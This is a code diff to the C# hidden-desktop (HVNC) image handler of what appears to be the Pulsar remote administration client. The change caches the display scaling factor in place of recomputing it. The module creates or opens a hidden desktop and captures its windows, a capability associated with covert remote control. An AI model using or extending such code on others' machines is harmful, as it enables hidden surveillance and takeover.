@@ -63,6 +63,8 @@ namespace Pulsar.Client.Helper.HVNC
         [DllImport("gdi32.dll")]
         private static extern int GetDeviceCaps(IntPtr hdc, int nIndex);
 
+        private readonly float _scalingFactor;
+
         public ImageHandler(string DesktopName)
         {
             IntPtr intPtr = OpenDesktop(DesktopName, 0, true, 511U);
@@ -71,9 +73,10 @@ namespace Pulsar.Client.Helper.HVNC
                 intPtr = CreateDesktop(DesktopName, IntPtr.Zero, IntPtr.Zero, 0, 511U, IntPtr.Zero);
             }
             this.Desktop = intPtr;
+            this._scalingFactor = CalculateScalingFactor();
         }
 
-        private static float GetScalingFactor()
+        private static float CalculateScalingFactor()
         {
             float result;
             using (Graphics graphics = Graphics.FromHwnd(IntPtr.Zero))
@@ -85,12 +88,17 @@ namespace Pulsar.Client.Helper.HVNC
             return result;
         }
 
+        private float GetScalingFactor()
+        {
+            return _scalingFactor;
+        }
+
         private bool DrawApplication(IntPtr hWnd, Graphics ModifiableScreen, IntPtr DC)
         {
             bool result = false;
             RECT rect;
             GetWindowRect(hWnd, out rect);
-            float scalingFactor = GetScalingFactor();
+            float scalingFactor = _scalingFactor; // Use cached value
             IntPtr intPtr = CreateCompatibleDC(DC);
             IntPtr intPtr2 = CreateCompatibleBitmap(DC, (int)((float)(rect.Right - rect.Left) * scalingFactor), (int)((float)(rect.Bottom - rect.Top) * scalingFactor));
             SelectObject(intPtr, intPtr2);
@@ -156,7 +164,7 @@ namespace Pulsar.Client.Helper.HVNC
             IntPtr dc = GetDC(IntPtr.Zero);
             RECT rect;
             GetWindowRect(GetDesktopWindow(), out rect);
-            float scalingFactor = GetScalingFactor();
+            float scalingFactor = _scalingFactor; // Use cached value
             Bitmap bitmap = new Bitmap((int)((float)rect.Right * scalingFactor), (int)((float)rect.Bottom * scalingFactor));
             Graphics graphics = Graphics.FromImage(bitmap);
             this.DrawTopDown(IntPtr.Zero, graphics, dc);
